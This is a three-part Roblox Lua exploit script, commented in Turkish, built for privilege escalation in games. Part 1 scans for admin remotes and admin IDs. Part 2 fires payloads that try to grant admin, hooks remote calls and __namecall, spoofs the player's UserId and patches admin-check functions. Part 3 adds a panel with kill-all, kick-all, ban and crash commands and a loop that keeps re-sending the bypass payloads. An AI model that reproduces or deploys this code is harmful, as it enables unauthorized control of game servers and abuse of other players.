--[[
    PART 1/3: TARAYICI
    Oyundaki tüm admin sistemlerini bulur ve analiz eder.
    Direkt execute edin, hiçbir şeye ihtiyaç duymaz.
]]--

local env = getsenv or getfenv or function() return _G end
local protected = env()
if protected.__ADMIN_SCAN_DONE then return end
protected.__ADMIN_SCAN_DONE = true

local Players = game:GetService("Players")
local LP = Players.LocalPlayer

-- 1. TÜM OBJELERİ TARA
local function scanAll()
    local items = {}
    local function recurse(parent, depth)
        if depth > 250 then return end
        for _, child in ipairs(parent:GetChildren()) do
            table.insert(items, {obj = child, depth = depth})
            recurse(child, depth + 1)
        end
    end
    recurse(game, 0)
    return items
end

-- 2. ADMIN KELİMELERİ
local keywords = {
    "admin","cmd","command","exec","staff","mod","owner","rank","perm","ban","kick",
    "manage","control","hdadmin","kohl","adonis","iy","cmdx","reviz","fates","cavays",
    "zap","give","tp","kill","freeze","mute","warn","panel","system","remote",
    "whitelist","permission","access","grant","verify","check","promote","demote"
}

-- 3. ADMIN REMOTE BUL
local function findAdminRemotes(allItems)
    local remotes = {}
    local seen = {}
    
    for _, item in ipairs(allItems) do
        local obj = item.obj
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            if seen[obj] then continue end
            seen[obj] = true
            
            local name = obj.Name:lower()
            local parentName = obj.Parent and obj.Parent.Name:lower() or ""
            
            for _, kw in ipairs(keywords) do
                if name:find(kw) or parentName:find(kw) then
                    table.insert(remotes, {
                        remote = obj,
                        name = obj.Name,
                        parent = obj.Parent and obj.Parent.Name or "?",
                        class = obj.ClassName
                    })
                    break
                end
            end
        end
    end
    
    return remotes
end

-- 4. ADMIN MODÜL BUL
local function findAdminModules(allItems)
    local modules = {}
    local seen = {}
    
    for _, item in ipairs(allItems) do
        local obj = item.obj
        if obj:IsA("ModuleScript") then
            if seen[obj] then continue end
            seen[obj] = true
            
            local name = obj.Name:lower()
            for _, kw in ipairs(keywords) do
                if name:find(kw) then
                    table.insert(modules, {
                        module = obj,
                        name = obj.Name,
                        parent = obj.Parent and obj.Parent.Name or "?"
                    })
                    break
                end
            end
        end
    end
    
    return modules
end

-- 5. ADMIN ID BUL (MODÜL İÇERİĞİNDEN)
local function findAdminIds(modules)
    local ids = {}
    local seen = {}
    
    for _, modData in ipairs(modules) do
        local ok, content = pcall(function()
            return require(modData.module)
        end)
        
        if ok and type(content) == "table" then
            local function deepSearch(t, d)
                if d > 15 then return end
                if type(t) ~= "table" then return end
                
                for k, v in pairs(t) do
                    local ks = tostring(k):lower()
                    if ks:find("admin") or ks:find("owner") or ks:find("whitelist") or ks:find("creator") then
                        if type(v) == "number" and v > 1000 then
                            if not seen[v] then
                                seen[v] = true
                                table.insert(ids, v)
                            end
                        elseif type(v) == "table" then
                            for _, iv in pairs(v) do
                                if type(iv) == "number" and iv > 1000 then
                                    if not seen[iv] then
                                        seen[iv] = true
                                        table.insert(ids, iv)
                                    end
                                end
                            end
                        end
                    end
                    if type(v) == "table" then
                        deepSearch(v, d + 1)
                    end
                end
            end
            
            deepSearch(content, 0)
        end
    end
    
    -- Eğer ID bulunamazsa owner tahmini yap
    if #ids == 0 then
        local highest = 0
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LP and p.UserId > highest then
                highest = p.UserId
            end
        end
        if highest > 0 then
            table.insert(ids, highest)
        end
    end
    
    return ids
end

-- 6. ANA TARAMA
print("══════════════════════════════════")
print("  PART 1: TARAYICI ÇALIŞIYOR")
print("══════════════════════════════════")

print("[TARAMA] Objeler toplanıyor...")
local allItems = scanAll()
print("[TARAMA] " .. #allItems .. " obje bulundu")

print("[TARAMA] Admin remote'ları aranıyor...")
local adminRemotes = findAdminRemotes(allItems)
print("[TARAMA] " .. #adminRemotes .. " admin remote tespit edildi")
for i, r in ipairs(adminRemotes) do
    print("  " .. i .. ". " .. r.name .. " (" .. r.parent .. ")")
end

print("[TARAMA] Admin modülleri aranıyor...")
local adminModules = findAdminModules(allItems)
print("[TARAMA] " .. #adminModules .. " admin modül tespit edildi")
for i, m in ipairs(adminModules) do
    print("  " .. i .. ". " .. m.name .. " (" .. m.parent .. ")")
end

print("[TARAMA] Admin ID'leri çıkarılıyor...")
local adminIds = findAdminIds(adminModules)
print("[TARAMA] " .. #adminIds .. " hedef ID bulundu")
for i, id in ipairs(adminIds) do
    print("  " .. i .. ". ID: " .. id)
end

-- VERİYİ PART 2'YE AKTAR
protected.__BYPASS_PART1_DATA = {
    adminRemotes = adminRemotes,
    adminModules = adminModules,
    adminIds = adminIds,
    totalRemotes = #adminRemotes
}

print("══════════════════════════════════")
print("  PART 1 TAMAMLANDI")
print("  Part 2'yi execute edin")
print("══════════════════════════════════")--[[
    PART 2/3: BYPASS MOTORU
    Part 1'den gelen verilerle bypass işlemini gerçekleştirir.
    Part 1 çalıştıktan SONRA execute edin.
]]--

local env = getsenv or getfenv or function() return _G end
local protected = env()
if protected.__ADMIN_BYPASS_DONE then return end
protected.__ADMIN_BYPASS_DONE = true

-- Part 1 verisini al
local data = protected.__BYPASS_PART1_DATA
if not data then
    warn("[PART 2] HATA: Part 1 verisi bulunamadı!")
    warn("[PART 2] Önce Part 1'i çalıştırın!")
    return
end

local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local adminRemotes = data.adminRemotes or {}
local adminModules = data.adminModules or {}
local adminIds = data.adminIds or {}
local targetId = adminIds[1] or 1

-- === BYPASS 1: DOĞRUDAN FIRE SALDIRISI ===
local function directFireAll()
    local payloads = {
        {"AddAdmin", LP.UserId, 999, true},
        {"GrantAdmin", LP.UserId, 999},
        {"Whitelist", "add", LP.UserId, LP.Name},
        {"SetPermission", LP.UserId, "Owner"},
        {"SetRank", LP.UserId, 255},
        {"SetAdminLevel", LP.UserId, 999},
        {"MakeOwner", LP.UserId},
        {"Promote", LP.UserId, 999},
        {LP.UserId, 999, true, "Owner"},
        {"Bypass", LP.UserId, 999},
        {"AdminPanel", LP.UserId, "Activate"},
        {"GiveAdmin", LP.Name, 999},
        {LP.Name, 999, true},
        {"", LP.UserId, 999},
        {"admin", LP.UserId, 999},
        {"bypass", LP.UserId, 999},
        {true, LP.UserId, 999},
        {"kohl", LP.UserId, 999},
        {"hdadmin", LP.UserId, 999},
        {"adonis", LP.UserId, 999},
    }
    
    for _, rData in ipairs(adminRemotes) do
        local remote = rData.remote
        spawn(function()
            for _, payload in ipairs(payloads) do
                pcall(function()
                    if remote:IsA("RemoteEvent") then
                        remote:FireServer(unpack(payload))
                    elseif remote:IsA("RemoteFunction") then
                        remote:InvokeServer(unpack(payload))
                    end
                end)
                task.wait(0.003)
            end
        end)
    end
end

-- === BYPASS 2: MODÜL ENV MANİPÜLASYONU ===
local function moduleEnvBypass()
    for _, mData in ipairs(adminModules) do
        local ok, env = pcall(function()
            return getsenv(mData.module)
        end)
        
        if ok and env then
            -- Admin kontrol fonksiyonlarını değiştir
            local funcs = {"IsAdmin","isAdmin","CheckAdmin","checkAdmin","HasPermission","hasPermission","GetRank","getRank","IsStaff","isStaff","IsOwner","isOwner"}
            
            for _, fn in ipairs(funcs) do
                if type(env[fn]) == "function" then
                    local orig = env[fn]
                    env[fn] = function(...)
                        local args = {...}
                        if args[1] == LP or args[1] == LP.UserId or args[1] == LP.Name then
                            return true, 999, "Owner"
                        end
                        return orig(...)
                    end
                end
            end
            
            -- Whitelist tablosuna kendimizi ekle
            local tables = {"Admins","admins","Whitelist","whitelist","AdminList","adminList","Owners","owners","Staff","staff"}
            for _, tn in ipairs(tables) do
                if type(env[tn]) == "table" then
                    env[tn][LP.UserId] = 999
                    env[tn][LP.Name] = "Owner"
                end
            end
        end
    end
end

-- === BYPASS 3: REMOTE FONKSİYON HOOK ===
local function hookRemoteFunctions()
    for _, rData in ipairs(adminRemotes) do
        local remote = rData.remote
        spawn(function()
            pcall(function()
                if remote:IsA("RemoteEvent") then
                    local oldFire = remote.FireServer
                    local newFire = function(self, ...)
                        local args = {...}
                        if #args >= 1 and type(args[1]) == "string" then
                            local cmd = args[1]:lower()
                            if cmd:find("check") or cmd:find("verify") or cmd:find("isadmin") then
                                return oldFire(self, LP.UserId, 999, true, "Owner")
                            end
                        end
                        if #args >= 1 and type(args[1]) == "number" and args[1] == LP.UserId then
                            return oldFire(self, args[1], 999, true, "Owner")
                        end
                        return oldFire(self, ...)
                    end
                    hookfunction(remote.FireServer, newFire)
                    
                elseif remote:IsA("RemoteFunction") then
                    local oldInvoke = remote.InvokeServer
                    local newInvoke = function(self, ...)
                        local args = {...}
                        if #args >= 1 and type(args[1]) == "string" then
                            local cmd = args[1]:lower()
                            if cmd:find("check") or cmd:find("verify") or cmd:find("isadmin") then
                                local res = oldInvoke(self, LP.UserId, 999, true, "Owner")
                                if res == false or res == nil then return true end
                                return res
                            end
                        end
                        local res = oldInvoke(self, ...)
                        if res == false or res == nil then return true end
                        return res
                    end
                    hookfunction(remote.InvokeServer, newInvoke)
                end
            end)
        end)
    end
end

-- === BYPASS 4: IDENTITY SPOOFING ===
local function identitySpoof()
    if targetId < 1 then return false end
    
    -- __index metatable override
    pcall(function()
        local mt = getrawmetatable(LP)
        if mt then
            local oldIndex = mt.__index
            mt.__index = function(self, key)
                if self == LP and key == "UserId" then
                    return targetId
                end
                if type(oldIndex) == "function" then
                    return oldIndex(self, key)
                elseif type(oldIndex) == "table" then
                    return oldIndex[key]
                end
            end
        end
    end)
    
    -- GetUserId override
    pcall(function()
        local oldGetId = LP.GetUserId
        hookfunction(LP.GetUserId, function(self)
            if self == LP then return targetId end
            return oldGetId(self)
        end)
    end)
    
    return true
end

-- === BYPASS 5: GLOBAL __NAMECALL HOOK ===
local function globalNamecallHook()
    local oldNc = hookmetamethod(game, "__namecall", function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        
        if method == "FireServer" or method == "InvokeServer" then
            local rname = tostring(self):lower()
            local isAdmin = false
            local keywords = {"admin","cmd","command","exec","staff","mod","owner","rank","perm","ban","kick"}
            for _, kw in ipairs(keywords) do
                if rname:find(kw) then isAdmin = true break end
            end
            if isAdmin then
                return oldNc(self, LP.UserId, 999, true, "Owner", "bypass")
            end
        end
        
        if method == "IsInGroup" then return true end
        if method == "GetRankInGroup" then return 255 end
        if method == "GetRoleInGroup" then return "Owner" end
        
        return oldNc(self, ...)
    end)
end

-- === TÜM BYPASS'LARI UYGULA ===
print("══════════════════════════════════")
print("  PART 2: BYPASS BAŞLATILIYOR")
print("══════════════════════════════════")

print("[1/5] Direct fire saldırısı...")
directFireAll()
print("[1/5] Payload'lar gönderildi")

print("[2/5] Modül env manipülasyonu...")
moduleEnvBypass()
print("[2/5] Modüller manipüle edildi")

print("[3/5] Remote fonksiyon hook...")
hookRemoteFunctions()
print("[3/5] Remote'lar hook'landı")

print("[4/5] Identity spoofing...")
local spoofOk = identitySpoof()
print("[4/5] " .. (spoofOk and "Başarılı (ID: " .. targetId .. ")" or "Başarısız"))

print("[5/5] Global namecall hook...")
globalNamecallHook()
print("[5/5] Global hook kuruldu")

-- Part 3 için durum aktar
protected.__BYPASS_PART2_STATUS = {
    directFired = true,
    moduleBypassed = true,
    remoteHooked = true,
    identitySpoofed = spoofOk,
    globalHooked = true,
    totalRemotes = #adminRemotes,
    targetId = targetId
}

print("══════════════════════════════════")
print("  PART 2 TAMAMLANDI")
print("  Part 3'ü execute edin")
print("══════════════════════════════════")--[[
    PART 3/3: MOBİL MENÜ + BAKIM DÖNGÜSÜ
    Part 1 ve 2 çalıştıktan SONRA execute edin.
    Küçük, kaydırılabilir, aç/kapa yapılabilir menü.
]]--

local env = getsenv or getfenv or function() return _G end
local protected = env()
if protected.__ADMIN_MENU_DONE then return end
protected.__ADMIN_MENU_DONE = true

-- Verileri al
local data = protected.__BYPASS_PART1_DATA or {}
local status = protected.__BYPASS_PART2_STATUS or {}
local adminRemotes = data.adminRemotes or {}
local targetId = data.adminIds and data.adminIds[1] or 1

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local LP = Players.LocalPlayer

-- === KOMUT GÖNDERME ===
local function sendCommand(cmd)
    for _, rData in ipairs(adminRemotes) do
        local remote = rData.remote
        spawn(function()
            pcall(function()
                local payloads = {
                    {cmd, LP.UserId, 999, true},
                    {"Execute", cmd, LP.UserId},
                    {"RunCommand", cmd, 999},
                    {cmd},
                }
                for _, p in ipairs(payloads) do
                    if remote:IsA("RemoteEvent") then
                        remote:FireServer(unpack(p))
                    else
                        remote:InvokeServer(unpack(p))
                    end
                    task.wait(0.003)
                end
            end)
        end)
    end
end

-- === MENÜ OLUŞTUR ===
local function createMenu()
    local gui = Instance.new("ScreenGui")
    gui.Name = "BypassPanel"
    gui.Parent = CoreGui
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    if syn and syn.protect_gui then
        syn.protect_gui(gui)
    end
    
    -- Ana panel (küçük)
    local panel = Instance.new("Frame")
    panel.Size = UDim2.new(0, 195, 0, 245)
    panel.Position = UDim2.new(1, -205, 0, 90)
    panel.BackgroundColor3 = Color3.fromRGB(18, 18, 20)
    panel.BorderSizePixel = 0
    panel.ClipsDescendants = true
    panel.Parent = gui
    
    local panelCorner = Instance.new("UICorner")
    panelCorner.CornerRadius = UDim.new(0, 10)
    panelCorner.Parent = panel
    
    -- Aç/kapa butonu
    local toggle = Instance.new("TextButton")
    toggle.Size = UDim2.new(0, 28, 0, 28)
    toggle.Position = UDim2.new(1, -33, 0, 5)
    toggle.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
    toggle.Text = "◄"
    toggle.Font = Enum.Font.SourceSansBold
    toggle.TextSize = 15
    toggle.BorderSizePixel = 0
    toggle.ZIndex = 10
    toggle.Parent = panel
    
    local toggleCorner = Instance.new("UICorner")
    toggleCorner.CornerRadius = UDim.new(0, 6)
    toggleCorner.Parent = toggle
    
    -- Başlık
    local title = Instance.new("Frame")
    title.Size = UDim2.new(1, 0, 0, 28)
    title.BackgroundColor3 = Color3.fromRGB(0, 120, 0)
    title.BorderSizePixel = 0
    title.Parent = panel
    
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 10)
    titleCorner.Parent = title
    
    local titleText = Instance.new("TextLabel")
    titleText.Size = UDim2.new(1, -40, 1, 0)
    titleText.Position = UDim2.new(0, 8, 0, 0)
    titleText.BackgroundTransparency = 1
    titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleText.Text = "⚡ BYPASS"
    titleText.Font = Enum.Font.SourceSansBold
    titleText.TextSize = 12
    titleText.TextXAlignment = Enum.TextXAlignment.Left
    titleText.Parent = title
    
    -- Kaydırılabilir içerik
    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, -6, 1, -33)
    scroll.Position = UDim2.new(0, 3, 0, 31)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = 3
    scroll.ScrollBarImageColor3 = Color3.fromRGB(0, 180, 0)
    scroll.CanvasSize = UDim2.new(0, 0, 0, 350)
    scroll.ScrollingDirection = Enum.ScrollingDirection.Y
    scroll.Parent = panel
    
    local list = Instance.new("UIListLayout")
    list.Padding = UDim.new(0, 2)
    list.Parent = scroll
    
    -- Durum
    local info = Instance.new("TextLabel")
    info.Size = UDim2.new(1, 0, 0, 30)
    info.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
    info.TextColor3 = Color3.fromRGB(0, 255, 0)
    info.Text = "🟢 " .. #adminRemotes .. " remote | ID:" .. targetId
    info.Font = Enum.Font.SourceSansBold
    info.TextSize = 10
    info.RichText = true
    info.Parent = scroll
    
    local infoCorner = Instance.new("UICorner")
    infoCorner.CornerRadius = UDim.new(0, 4)
    infoCorner.Parent = info
    
    -- Komut kutusu
    local cmdBox = Instance.new("TextBox")
    cmdBox.Size = UDim2.new(1, 0, 0, 24)
    cmdBox.BackgroundColor3 = Color3.fromRGB(30, 30, 33)
    cmdBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    cmdBox.PlaceholderText = "Komut gir..."
    cmdBox.PlaceholderColor3 = Color3.fromRGB(130, 130, 130)
    cmdBox.Text = ""
    cmdBox.Font = Enum.Font.SourceSans
    cmdBox.TextSize = 11
    cmdBox.BorderSizePixel = 0
    cmdBox.Parent = scroll
    
    local cmdCorner = Instance.new("UICorner")
    cmdCorner.CornerRadius = UDim.new(0, 4)
    cmdCorner.Parent = cmdBox
    
    cmdBox.FocusLost:Connect(function(enter)
        if enter and cmdBox.Text ~= "" then
            sendCommand(cmdBox.Text)
            cmdBox.Text = ""
        end
    end)
    
    -- Butonlar
    local buttons = {
        {"🛡️ God", "god"},
        {"🦅 Fly", "fly"},
        {"🚶 NoClip", "noclip"},
        {"👁️ ESP", "esp"},
        {"💀 Kill All", "kill all"},
        {"🔨 Ban", "ban"},
        {"👢 Kick All", "kick all"},
        {"❄️ Freeze", "freeze"},
        {"💥 Explode", "explode"},
        {"🔄 Respawn", "respawn"},
        {"📋 Info", "info"},
        {"💣 Crash", "crash"},
    }
    
    for _, btnData in ipairs(buttons) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, 0, 0, 23)
        btn.BackgroundColor3 = Color3.fromRGB(32, 32, 35)
        btn.TextColor3 = Color3.fromRGB(220, 220, 220)
        btn.Text = btnData[1]
        btn.Font = Enum.Font.SourceSans
        btn.TextSize = 10
        btn.BorderSizePixel = 0
        btn.Parent = scroll
        
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 4)
        btnCorner.Parent = btn
        
        btn.MouseButton1Click:Connect(function()
            sendCommand(btnData[2])
            btn.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
            task.wait(0.15)
            btn.BackgroundColor3 = Color3.fromRGB(32, 32, 35)
        end)
    end
    
    -- Aç/kapa mantığı
    local visible = true
    
    toggle.MouseButton1Click:Connect(function()
        visible = not visible
        if visible then
            panel.Size = UDim2.new(0, 195, 0, 245)
            panel.Position = UDim2.new(1, -205, 0, 90)
            title.Visible = true
            scroll.Visible = true
            toggle.Text = "◄"
            toggle.Position = UDim2.new(1, -33, 0, 5)
        else
            panel.Size = UDim2.new(0, 32, 0, 32)
            panel.Position = UDim2.new(1, -42, 0, 10)
            title.Visible = false
            scroll.Visible = false
            toggle.Text = "►"
            toggle.Position = UDim2.new(0, 2, 0, 2)
        end
    end)
    
    -- Sürükleme
    local drag = false
    local dragStart = nil
    local posStart = nil
    
    local function startDrag(input)
        drag = true
        dragStart = input.Position
        posStart = panel.Position
    end
    
    title.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
            startDrag(input)
        end
    end)
    
    toggle.InputBegan:Connect(function(input)
        if not visible then
            if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
                startDrag(input)
            end
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if drag and dragStart then
            local delta = input.Position - dragStart
            panel.Position = UDim2.new(posStart.X.Scale, posStart.X.Offset + delta.X, posStart.Y.Scale, posStart.Y.Offset + delta.Y)
        end
    end)
    
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.TouchEnded or input.UserInputType == Enum.UserInputType.MouseButton1 then
            drag = false
            dragStart = nil
        end
    end)
    
    return gui
end

-- === BAKIM DÖNGÜSÜ ===
local function maintenanceLoop()
    -- Sürekli bypass tazeleme
    spawn(function()
        while true do
            task.wait(12)
            for _, rData in ipairs(adminRemotes) do
                local remote = rData.remote
                spawn(function()
                    pcall(function()
                        if remote:IsA("RemoteEvent") then
                            remote:FireServer("MaintenanceBypass", LP.UserId, 999, true)
                            remote:FireServer(LP.UserId, 999, true, "Owner")
                        else
                            remote:InvokeServer("MaintenanceBypass", LP.UserId, 999, true)
                            remote:InvokeServer(LP.UserId, 999, true, "Owner")
                        end
                    end)
                end)
                task.wait(0.01)
            end
        end
    end)
    
    -- Network ownership (varsa)
    spawn(function()
        while true do
            task.wait(8)
            pcall(function()
                for _, obj in ipairs(Workspace:GetDescendants()) do
                    if obj:IsA("BasePart") and not obj.Anchored then
                        obj:SetNetworkOwner(LP)
                    end
                end
            end)
        end
    end)
end

-- === BAŞLAT ===
print("══════════════════════════════════")
print("  PART 3: MENÜ + BAKIM")
print("══════════════════════════════════")

createMenu()
print("[MENÜ] Panel oluşturuldu")
print("[MENÜ] Sağ üstte yeşil buton")
print("[MENÜ] Aç/kapa: Butona tıkla")
print("[MENÜ] Sürükle: Başlıktan tut")

maintenanceLoop()
print("[BAKIM] Döngü başlatıldı")

print("══════════════════════════════════")
print("  TÜM SİSTEM AKTİF")
print("  " .. #adminRemotes .. " remote bypass ediliyor")
print("══════════════════════════════════")
